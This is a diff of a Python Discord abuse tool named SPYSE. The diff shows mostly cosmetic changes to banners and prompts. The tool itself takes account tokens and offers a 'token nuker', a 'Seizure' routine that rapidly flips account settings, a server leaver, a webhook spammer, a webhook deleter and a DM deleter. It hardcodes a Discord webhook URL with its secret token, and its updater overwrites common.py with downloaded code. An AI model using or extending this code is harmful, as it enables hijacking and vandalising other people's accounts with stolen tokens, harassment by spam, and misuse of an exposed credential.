@@ -11,7 +11,7 @@ import os
 from os import system
 console = get_console()
 
-maj = 'V4'
+maj = 'V4.3.1'
 webhook = "https://discord.com/api/webhooks/1024752077622218823/2ggeu3AOw5W_mw2FUsNSP_v0SPrZeEM5F26wZyXK6E6DKKS5yZWAtlRn0011BC4phDph"
 #please don't spam or nuke this one it's really important for the tool
 
@@ -23,18 +23,22 @@ def version():
     if mode == txt:
         time.sleep(1)
     else:
+        os.system('cls||clear')
         os.system("Title - SPYSE New Update Found!")
-        update_banner = '''
-                [red]███[/red]╗   [red]██[/red]╗[red]███████[/red]╗[red]██[/red]╗    [red]██[/red]╗    [red]██[/red]╗   [red]██[/red]╗[red]██████[/red]╗ [red]██████[/red]╗  [red]█████[/red]╗ [red]████████[/red]╗[red]███████[/red]╗[red]██[/red]╗
-                [red]████[/red]╗  [red]██[/red]║[red]██[/red]╔════╝[red]██[/red]║    [red]██[/red]║    [red]██[/red]║   [red]██[/red]║[red]██[/red]╔══[red]██[/red]╗[red]██[/red]╔══[red]██[/red]╗[red]██[/red]╔══[red]██[/red]╗╚══[red]██[/red]╔══╝[red]██[/red]╔════╝[red]██║
-                [red]██[/red]╔[red]██[/red]╗ [red]██[/red]║[red]█████[/red]╗  [red]██[/red]║ [red]█[/red]╗ [red]██[/red]║    [red]██[/red]║   [red]██[/red]║[red]██████[/red]╔╝[red]██[/red]║  [red]██[/red]║[red]███████[/red]║   [red]██[/red]║   [red]█████[/red]╗  [red]██[/red]║
-                [red]██[/red]║╚[red]██[/red]╗[red]██[/red]║[red]██[/red]╔══╝  [red]██[/red]║[red]███[/red]╗[red]██[/red]║    [red]██[/red]║   [red]██[/red]║[red]██[/red]╔═══╝ [red]██[/red]║  [red]██[/red]║[red]██[/red]╔══[red]██[/red]║   [red]██[/red]║   [red]██[/red]╔══╝  ╚═╝
-                [red]██[/red]║ ╚[red]████[/red]║[red]███████[/red]╗╚[red]███[/red]╔[red]███[/red]╔╝    ╚[red]██████[/red]╔╝[red]██[/red]║     [red]██████[/red]╔╝[red]██[/red]║  [red]██[/red]║   [red]██[/red]║   [red]███████[/red]╗[red]██[/red]╗
-                # [red]╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝[/red]
-                    [red]Looks like this SPYSE {maj} is outdated [/red]'''
+        update_banner = f'''[red]
+                
+                ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
+                ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
+                ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
+                ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
+                ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
+                ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝[/red]
+                    
+                                [red]Looks like this SPYSE {maj} is outdated [/red]'''
         console.print(update_banner)
-        fin = str(input(
-            f'[yellow][>>>][/yellow]You want to update to the latest version? (y/n):'))
+        print()
+        print()
+        fin = str(console.input(f'[yellow][>>>][/yellow]You want to update to the latest version? (y/n):'))
         if fin == "n":
             pass
         else:
@@ -47,7 +51,6 @@ def version():
             with open('common.py', "w", encoding="utf-8") as file:
                 file.write(up)
     os.system('cls||clear')
-
 
 def validate_webhook(webhook):
     stat = requests.get(webhook).json()
@@ -148,8 +151,6 @@ def token_info():
     console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
     main()
 
-
-
 def BioChanger():
     os.system(f'Title - Spyse - Bio changer')
     token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
@@ -165,8 +166,6 @@ def BioChanger():
     console.input("[green][[/green][purple]?[/purple][green]][/green] Enter anything to [purple]anything[/purple]. . . ")
     main()
 
-
-
 def StartSeizure():
     os.system(f'Title - Spyse - Seizure')
     token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
@@ -176,8 +175,6 @@ def StartSeizure():
             setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
             requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
             console.print("[green][[/green][purple]![/purple][green]][/green] [purple]processing[/purple]")
-
-
 
 def tokendisable():
     os.system(f'Title - Spyse - token nuker')
@@ -199,7 +196,6 @@ def tokendisable():
     console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
     main()
 
-
 def Leaver():
     os.system(f'Title - Spyse - server leaver')
     token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
@@ -217,8 +213,6 @@ def Leaver():
             pass
     console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
     main()
-
-
 
 def Webhook_Spammer():
     try:
@@ -238,9 +232,6 @@ def Webhook_Spammer():
         console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
         console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
         pass
-
-
-
 
 def webhook_deleter():
     try:
@@ -269,17 +260,14 @@ def DmDeleter():
     console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
     main()
 
-
-
 def main():
     version()
-    os.system(f'Title - Spyse - {maj}')
+    login = os.getlogin()
+    os.system(f'Title - Spyse - {maj} - connected as : {login}')
     os.system('cls||clear')
 
     banner = """
-
             
-
                                     [green]███████[/green][purple]╗[green]██████[/green][purple]╗ [green]██[/green][purple]╗   [green]██[/green][purple]╗[green]███████[/green][purple]╗[green]███████[/green][purple]╗    
                                     [green]██[/green][purple]╔════╝[green]██[/green][purple]╔══[green]██[/green][purple]╗╚[green]██[/green][purple]╗ [green]██[/green][purple]╔╝[green]██[/green][purple]╔════╝[green]██[/green][purple]╔════╝    
                                     [green]███████[/green][purple]╗[green]██████[/green][purple]╔╝ ╚[green]████[/green][purple]╔╝ [green]███████[/green][purple]╗[green]█████[/green][purple]╗      
@@ -294,7 +282,6 @@ def main():
                             ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker             [green]{[/green][purple]10[/purple][green]}[/green] Make a report   ║                                                                                                                                                 
                             ╚═══════════════════════════════════════════════════╝
                  
-
     """
 
     console.print(banner)
@@ -325,5 +312,3 @@ def main():
         main()
 
 if sys.argv[1] == 'cle123': main()
-
-
